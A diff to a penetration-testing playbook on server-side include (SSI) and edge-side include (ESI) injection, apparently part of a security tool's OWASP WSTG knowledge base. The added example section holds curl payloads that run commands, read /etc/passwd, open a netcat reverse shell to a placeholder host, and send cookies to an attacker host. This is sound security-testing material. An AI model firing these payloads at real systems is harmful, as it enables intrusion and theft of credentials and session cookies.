@@ -8,8 +8,8 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: [CWE-90]
-chains_with: []
-prerequisites: []
+chains_with: [wstg-inpv-06, wstg-inpv-01]
+prerequisites: [wstg-conf-01, wstg-conf-02]
 severity_boost: {}
 ---
 
@@ -287,6 +287,52 @@ Admin content
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Quick SSI injection probe
+curl -s "https://{target}/page.shtml?input=%3C%21--%23exec+cmd%3D%22id%22+--%3E"
+
+# Confirm SSI processing via date echo
+curl -s "https://{target}/page.shtml" -d 'comment=<!--#echo var="DATE_LOCAL" -->'
+
+# Read /etc/passwd through SSI include
+curl -s "https://{target}/page.shtml?input=%3C%21--%23include+virtual%3D%22%2Fetc%2Fpasswd%22+--%3E" | grep -o 'root:.*'
+```
+
+| Payload | Technique | Detection Pattern |
+| --- | --- | --- |
+| `<!--#exec cmd="id" -->` | Command execution | `uid=` / `gid=` in response |
+| `<!--#include virtual="/etc/passwd" -->` | File inclusion | `root:.*:0:0:` in response |
+| `<!--#echo var="DATE_LOCAL" -->` | Detection | Day-of-week string appears though payload wasn't reflected literally |
+| `<!--#printenv -->` | Environment disclosure | `DOCUMENT_ROOT`, `SERVER_SOFTWARE` strings in response |
+| `<!--#exec cmd="mkfifo /tmp/f;nc {ip} {port} 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` | Reverse shell via SSI exec | Inbound connection on listener |
+
+### Edge Side Includes (ESI) Injection — for responses passed through a caching surrogate (Varnish/Squid/Akamai/Fastly)
+
+SSI and ESI are different attack surfaces: SSI runs on the origin web server, ESI runs on the CDN/reverse-proxy layer, so ESI is reachable even when the origin has no SSI processing at all. Some surrogates require the upstream response to carry `Surrogate-Control: content="ESI/1.0"` before they will process ESI tags in the body.
+
+```bash
+# Blind detection via OOB callback
+curl -s "https://{target}/page?input=%3Cesi%3Ainclude%20src%3Dhttp%3A%2F%2F{collaborator}%3E"
+
+# XSS via injected ESI include
+curl -s "https://{target}/page?input=<esi:include src=http://{attacker}/xss.html>"
+
+# Cookie exfiltration (surrogate substitutes $(HTTP_COOKIE))
+curl -s "https://{target}/page?input=<esi:include src=http://{attacker}/steal?c=\$(HTTP_COOKIE)>"
+
+# Local file/secret disclosure via surrogate-side include
+curl -s "https://{target}/page?input=<esi:include src=\"/supersecret.txt\">"
+
+# Debug info disclosure (Akamai/Squid)
+curl -s "https://{target}/page?input=<esi:debug/>"
+```
+
+Support for vars/cookies/host-allowlist varies by surrogate (Squid3, Varnish, Fastly, Akamai ETS, Node `esi`/`nodesi`) — test each capability individually since a WAF/CDN may only expose a subset.
+
+---
+
 ## Remediation
 
 ```apache
@@ -332,6 +378,13 @@ ssi_types text/html;
 | ---------- | ----------------------------------------------------- |
 | **CWE-97** | Improper Neutralization of Server-Side Includes (SSI) |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-08: Testing for SSI Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection)
+- [PayloadsAllTheThings - Server Side Includes Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Includes%20Injection)
 
 ---
 
